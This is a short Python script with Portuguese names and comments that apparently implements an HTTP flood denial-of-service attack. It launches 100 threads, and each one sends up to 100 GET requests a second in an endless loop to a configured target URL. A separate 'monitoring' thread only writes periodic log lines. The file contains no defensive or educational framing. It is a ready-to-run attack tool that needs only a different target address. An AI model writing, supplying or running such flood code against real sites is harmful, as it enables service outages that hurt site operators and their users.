import requests
import threading
import time
import datetime
import logging

# Configurações
url_alvo = "http://example.com"
numero_de_threads = 100
intervalo_de_requisicao = 0.1  # 100 ms
tempo_limite_de_requisicao = 5  # 5 segundos
maximo_requisicoes_por_segundo = 100

# Configurar o logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def inundacao_http():
    while True:
        tempo_inicio = time.time()
        for i in range(maximo_requisicoes_por_segundo):
            try:
                resposta = requests.get(url_alvo, timeout=tempo_limite_de_requisicao)
                logging.info(f"Requisição enviada para {url_alvo} às {datetime.datetime.now()}")
            except requests.RequestException as e:
                logging.error(f"Erro ao enviar a requisição: {str(e)}")
        tempo_decorrido = time.time() - tempo_inicio
        if tempo_decorrido < 1:
            time.sleep(1 - tempo_decorrido)

def monitorar_trafego():
    while True:
        logging.info("Monitorando o tráfego")
        time.sleep(60)  # Monitora a cada 60 segundos

def main():
    threads = []
    for i in range(numero_de_threads):
        t = threading.Thread(target=inundacao_http)
        threads.append(t)
        t.start()

    thread_monitoramento = threading.Thread(target=monitorar_trafego)
    thread_monitoramento.start()

    for t in threads:
        t.join()

    thread_monitoramento.join()

if __name__ == "__main__":
    main()
